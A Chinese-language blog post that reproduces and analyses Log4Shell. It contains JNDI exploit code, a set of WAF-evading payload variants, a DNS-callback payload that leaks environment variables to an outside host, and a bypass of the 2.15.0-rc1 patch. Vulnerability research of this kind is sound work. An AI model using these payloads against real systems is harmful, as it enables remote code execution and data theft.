---
title: Log4shell
date: 2026-09-17
---

# Log4shell

## Log4j2 基础开发

### 环境

- JDK8u65
- Log4j2 2.14.1
- CC 3.2.1

### Demo

log4j 和 log4j2 都是日志管理工具，相比于 log4j，log4j2 更加主流，市场上很多项目都是 slf4j + log4j2。

pom.xml：

````xml
<dependency>  
 <groupId>org.apache.logging.log4j</groupId>  
 <artifactId>log4j-core</artifactId>  
 <version>2.14.1</version>  
</dependency>   
<dependency>  
 <groupId>org.apache.logging.log4j</groupId>  
 <artifactId>log4j-api</artifactId>  
 <version>2.14.1</version>  
</dependency>  
<dependency>  
 <groupId>junit</groupId>  
 <artifactId>junit</artifactId>  
 <version>4.12</version>  
 <scope>test</scope>  
</dependency>
````

这里 log4j2 的实现方式就用 xml 来：

```xml
<?xml version="1.0" encoding="UTF-8"?>

<configuration status="info">
    <Properties>
        <Property name="pattern1">[%-5p] %d %c - %m%n</Property>
        <Property name="pattern2">
            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n
        </Property>
        <Property name="filePath">logs/myLog.log</Property>
    </Properties>
    <appenders> <Console name="Console" target="SYSTEM_OUT">
        <PatternLayout pattern="${pattern1}"/>
    </Console> <RollingFile name="RollingFile" fileName="${filePath}"
                            filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">
        <PatternLayout pattern="${pattern2}"/>
        <SizeBasedTriggeringPolicy size="5 MB"/>
    </RollingFile>
    </appenders>
    <loggers>
        <root level="info">
            <appender-ref ref="Console"/>
            <appender-ref ref="RollingFile"/>
        </root>
    </loggers>
</configuration>
```

demo：

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class Log4j2Test01 {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);
        logger.trace("trace level");
        logger.debug("debug level");
        logger.info("info level");
        logger.warn("warn level");
        logger.error("error level");
        logger.fatal("fatal level");
    }
}
```

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/RunCode.png)

一般应用：

```java
import org.apache.logging.log4j.LogManager;  
import org.apache.logging.log4j.Logger;  
  
import java.util.function.LongFunction;  
  
public class RealEnv {  
    public static void main(String[] args) {  
        Logger logger = LogManager.getLogger(LongFunction.class);  
  
 		String username = "solo";  
 		if (username != null) {  
            logger.info("User {} login in!", username);  
 		}  
        else {  
            logger.error("User {} not exists", username);  
 		}  
    }  
}
```

## Log4j2 漏洞分析

### 影响版本

2.x <= log4j <= 2.15.0-rc1

### 漏洞原理

我们可以看到在`logger.info("User {} login in!", username);`这一句，实际上——`username`这个参数是可控的。那么这里我们可以尝试一下其他的输入，比如`${java:os}`。

![2](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/OS.png)

这里就打印出来了一些操作系统的信息。这里的设计就有一些问题，官方文档中说明这是 log4j2 自带的一个功能。

![3](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookup.png)

如果按照官网上面那几个 api 来看并不严重，顶对就是日志和我们输入对不上，并不会引起大的安全问题。

> 但这里的问题是，这里的 lookup 是基于 JNDI 的，而 JNDI 直接调用 lookup() 是会存在漏洞的

## 漏洞复现与 EXP

exp：

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class log4j2EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:ldap://10.88.15.45:1389/remoteExploit8}";

        logger.info("User {} login in!", username);
    }
}
```

用 github 上面的项目起一个恶意 LDAP 服务器，成功弹出计算器。

## 调试分析

### 攻击分析

断点打在`PatternLayout`类的内部类`PatternSerializer`里的`toSerializable()`方法。

![3](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Point.png)

往下走，先是一个循环，遍历`formatters`一段一段的拼接输出的内容。两个传进去进行处理的变量，一个是`event`，也就是 log4j2 需要进行日志打印的内容，另一个`buffer`，会把打印出来的东西写到`buffer`里去。

跟进到`format()`方法，这个方法可以把它当作是处理字符串的一个方法，具体如何处理是根据具体情况重写的。

因为这是一个循环来遍历`formatters`的，中间会进行很多数据处理的工作，这都不重要，但是有一点很重要，当`i=7`的时候进入`format()`的时候，也就是`buffer`参数为日志的时候，进入另一个`format()`处理方法。

![4](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/format01.png)

![5](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/format02.png)

这里`event`还是同一个。

进入这个`format()`方法里后，先判断是否是 log4j2 的 lookups 功能，这里我们就是 lookups 功能，所以继续走下去。

![6](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/JudgeLookups.png)

继续往下走，会遍历`workingBuilder`来进行判断，如果`workingBuilder`中存在`${`，那么就会取出从`$`开始直到最后的字符串。

![7](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/payload.png)

`workingBuilder`的内容如下：

![8](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/workinigBuilder.png)

`value`就是我们输入的 payload`${jndi:ldap://10.88.15.201:1389/remoteExploit8}`。跟进到`replace()`方法，`replace()`方法里面调用了`substitute()`方法。

![9](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/substitute.png)

跟进之后 f7 进入到这里：

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/substituteIn.png)

继续往下走，直到这个 while 循环里，在这个循环里会对字符进行逐字匹配`${`：

![2](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/chars.png)

然后进行循环读取，直到读取到`}`并获取其坐标，然后将`${}`中间的内容取出来，然后调用`this.subtitute`来进行处理。

![4](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/GetValue.png)

再次运行`subtitue`由于我们已经没有`${}`所以就直接来到下面，将`varName`作为变量传入`resolveVariable`方法：

![4](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/resolveVariable.png)

`varName` 就是为 `${}` 中的值。

![5](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/varName.png)

可以猜测`resolver`解析时支持的关键词有`[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]`，而我们这里利用的`jndi:xxx`后续就会用到`JndiLookup`这个解析器。

![6](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Keyword.png)

![7](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Keyword02.png)

这里我们看到 `resolveVariable()` 方法里面是调用了 `lookup()` 方法，这个 `lookup()` 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的 `lookup()` 方法的，是存在漏洞的。

![8](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookupHole.png)

![9](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/jndiLookup.png)

可以再往里面跟进一下：

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/NormalJndi.png)

然后就是 JNDI 常规的注入了。

### 小结调试

1. 先判断内容是否有`${}`，然后截取`${}`中的内容，就会得到我们的恶意 payload：`jndi:xxx`
2. 然后使用`:`来分割 payload，通过前缀来判断使用什么解析器去`lookup`
3. 支持的前缀包括`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`，后续的绕过可能会用到这些。

## WAF 的常规绕过

很多 WAF 检测是否存在`jndi:`等关键词进行判断的，下面讲讲绕过手法。

根据官方文档中的描述，如果参数未定义，那么`:-`后面的就是默认值。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Doc.png)

### 利用分隔符和多个 ${} 绕过

```java
logg.info("${${::-J}ndi:ldap://127.0.0.1:1389/Calc}");
```

这里`${::-J}`第一个`:`前面是变量名是空，所以就会使用`:-`后面的`J`作为默认值。后续 log4j2 解析的时候就会把`${::-J}`解析为`J`然后拼接起来得到`jndi`。

### 通过 lower 和 upper 绕过

log4j2 中允许一些字段`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`，其中就有`lower`和`upper`。同样可以使用`lower`和`upper`来进行绕过。

```java
logg.info("${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}");
logg.info("${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}");
....
```

同时也可以利用一些特殊字符的大小写转化的问题：

> ı => upper => i (Java 中测试可行)
>
> ſ => upper => S (Java 中测试可行)
>
> İ => upper => i (Java 中测试不可行)
>
> K => upper => k (Java 中测试不可行)

现在很多数据传输都是用 json 格式，所以在 json 中我们也可以尝试。像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以可以尝试编码绕过。

### payload 总结

**原始 payload**

```java
"${jndi:ldap://127.0.0.1:1234/ExportObject}"
```

对应的绕过：

```java
${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject};
  
${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}";
  
${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}";
  
${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}";
  
${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}";
```

### 特殊手法

像其他解析器，比如通过`sys`和`env`协议，结合`jndi`可以读取到一些环境变量和系统变量，在特定情况下可能可以读取到系统密码。

```java
'${jndi:ldap://${env:LOGNAME}.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com}'
```

## Log4j2 2.15.0 漏洞修复和绕过

### 修复

官方给了 CVE 编号和补丁，升级到 2.15.0 之后默认不开启 JNDI lookup。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/2150Repair.png)

漏洞的修复主要是在`JndiManager#lookup`中增加了代码，因为最终的触发点就在这里。

对比一下 2.14.1 和 2.15.0 两个版本的差别：

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/diffConverter.png)

2.14.1 的版本会进行`${}`的判断，而 2.15.0 的版本会直接把它`toAppendTo`进去。这里是同一个的`format()`方法，所以这里是 2.15.0 的一个修复点。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/diffMessageFormat.png)

在`MessagePatternConverter`这个类里找到之前 2.14.1 版本中的调用语句`config.getStrSubstitutor().replace(event, value)`，结果能找到一个非常类似的语句。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/replaceIn.png)

看一下`replaceIn()`这个方法，它所在的类是`StrSubstitutor`，这和 2.14.1 里分析的是一样的过程。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/StrSubstitutorReplaceIn.png)

调用 `replaceIn()` 方法的 `format()` 方法是隶属于 `LookupMessagePatternConverter` 这个类的，而这个类继承了 `MessagePatternConverter`；如果我们要进到 `LookupMessagePatternConverter` 这个类里面去，需要满足前文提到的 `Converter` 为 `LookupMessagePatternConverter` 这个类。

但是怎么样才能让 `converter` 的类变成 `LookupMessagePatternConverter`，而不是 `SimpleMessagePatternConverter` 呢？

在`newInstance()`方法中会调用`loadLookups()`方法，在`loadLookups()`方法中会根据`if (LOOKUPS.equalsIgnoreCase(option))`的结果来判断是哪一个`Converter`。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/TwoFactors.png)

这里的限制因素其实都是需要我们手动去修改的，在实际渗透的过程中不可能会遇到这种情况。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookupValueJudge.png)

所以这个补丁绕过比较鸡肋。

手动开启的 lookup 在 resources 中添加 log4j2.xml 文件。

```xml
<configuration status="OFF" monitorInterval="30">
    <appenders>
        <console name="CONSOLE-APPENDER" target="SYSTEM_OUT">
            <PatternLayout pattern="%m{lookups}%n"/>
        </console>
    </appenders>

    <loggers>
        <root level="error">
            <appender-ref ref="CONSOLE-APPENDER"/>
        </root>
    </loggers>
</configuration>
```

exp：

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;

import java.util.function.LongFunction;

public class BypassRc1EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,
            new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:1234/ExportObject}"),null);
        messagePatternConverter.format(logEvent,new StringBuilder("${jndi:ldap://127.0.0.1:1234/ExportObject}"));
    }
}
```

这样就能进入`JndiManager#lookup`方法了，这里对比 2.14.1 的变化还是很大的，其中做了很多限制。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/2150Change.png)

在最开始的 `this.allowedProtocols` 为 `{java,ldap,ldaps}` 我们的 ldap 在其中，所以会继续。接下来就是 `this.allowedHosts` 的限制，这个限制的非常死，只允许本地host。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/hosts.png)

后面还有对 javaSerializedData 中的 classname 做了处理；以及 Reference 和 javaFactory 做了处理，也就是对 JDNI 注入做了处理。但是最终的绕过是因为异常这里没用限制，所以我们传入的 payload 可以是这样`"${jndi:ldap://127.0.0.1:1234/ ExportObject}"`，也就是多一个空格就可以进入`catch`里面。

![1](https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Space.png)

最终 exp：

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;

import java.util.function.LongFunction;

// 绕过 rc1 的 EXP，Windows 无法触发
public class BypassRc1EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,
                new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:1234/ ExportObject}"),null);
        messagePatternConverter.format(logEvent,new StringBuilder("${jndi:ldap://127.0.0.1:1234/ ExportObject}"));
    }
}
```































